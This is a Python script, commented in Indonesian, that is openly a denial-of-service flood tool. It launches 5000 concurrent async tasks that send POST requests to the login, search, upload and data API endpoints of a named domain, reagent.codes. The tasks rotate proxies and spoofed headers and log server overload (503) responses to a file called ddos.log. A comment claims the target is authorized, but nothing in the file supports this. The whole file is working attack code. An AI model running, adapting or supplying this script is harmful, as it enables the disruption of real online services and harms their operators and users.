import asyncio
import aiohttp
import random
import time
import signal
from datetime import datetime
from urllib.parse import urljoin
import logging
import os

# Target yang diizinkan
TARGET = "https://reagent.codes"
PROXY_LIST = [
    "http://10.0.0.1:8080",
    "http://10.0.0.2:8080",
    "http://10.0.0.3:8080",
    # Tambahkan proxy sesuai kebutuhan (harus sesuai scope reagent.codes)
]
HEADERS_TEMPLATES = [
    {
        "User-Agent": f"Mozilla/{random.uniform(5.0, 12.0)} (compatible; MSIE 6.0; Windows NT 5.1)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    },
    # Tambahkan template header lain
]

# Konfigurasi
MAX_REQUESTS = 5000
REQUESTS_PER_SECOND = 100  # Rate limit
CONNECTION_TIMEOUT = 5
READ_TIMEOUT = 10
MAX_RETRIES = 3
ENDPOINTS = ["/api/v1/login", "/api/v1/search", "/api/v1/upload", "/api/v1/data"]  # Target endpoint spesifik
STOP_SIGNAL_RECEIVED = False

# Logging
LOG_FILE = "ddos.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# === FUNGSI UTAMA ===
async def attack(session, proxy):
    global STOP_SIGNAL_RECEIVED
    while not STOP_SIGNAL_RECEIVED:
        try:
            # Pilih endpoint secara random
            endpoint = random.choice(ENDPOINTS)
            url = urljoin(TARGET, endpoint)
            
            # Pilih header acak
            headers = random.choice(HEADERS_TEMPLATES)
            
            # Buat payload acak
            payload = {
                "timestamp": int(time.time()),
                "key": f"value_{random.randint(1, 1000)}",
            }
            
            # Set timeout dinamis
            timeout = aiohttp.ClientTimeout(
                total=None,
                sock_connect=CONNECTION_TIMEOUT,
                sock_read=READ_TIMEOUT
            )
            
            # Kirim request
            async with session.post(url, headers=headers, json=payload, proxy=proxy, timeout=timeout) as response:
                status = response.status
                content_type = response.headers.get("Content-Type", "unknown")
                
                # Analisis respon server
                if status == 503:
                    logging.warning(f"[503] Service Unavailable - Target overload detected")
                elif status >= 400:
                    logging.warning(f"[{status}] Error - {url}")
                else:
                    logging.info(f"[{status}] Success - {url} | {content_type}")
                
                # Kontrol rate (sleep dinamis)
                await asyncio.sleep(1 / REQUESTS_PER_SECOND)
                
        except (aiohttp.ClientError, asyncio.TimeoutError, ConnectionError) as e:
            logging.error(f"[ERROR] {e}")
            await asyncio.sleep(2)  # Retry delay
            continue
        except Exception as e:
            logging.critical(f"[CRITICAL] {e}")
            break

# === MANAJEMEN PROXY ===
def rotate_proxies():
    while True:
        yield random.choice(PROXY_LIST)
        time.sleep(1)

# === HANDLER SINYAL ===
def signal_handler(sig, frame):
    global STOP_SIGNAL_RECEIVED
    logging.info(f"[STOP] Signal {sig} received. Stopping attack...")
    STOP_SIGNAL_RECEIVED = True

# === FUNGSI UTAMA ===
async def main():
    # Registrasi handler sinyal
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Buat session aiohttp
    connector = aiohttp.TCPConnector(limit_per_host=100, ssl=False)
    proxy_cycle = rotate_proxies()
    
    # Buat task async
    tasks = []
    async with aiohttp.ClientSession(connector=connector) as session:
        for _ in range(MAX_REQUESTS):
            proxy = next(proxy_cycle)
            task = asyncio.create_task(attack(session, proxy))
            tasks.append(task)
        
        # Tunggu semua task selesai
        await asyncio.gather(*tasks)

# === EKSEKUSI ===
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("[EXIT] Script stopped by user.")
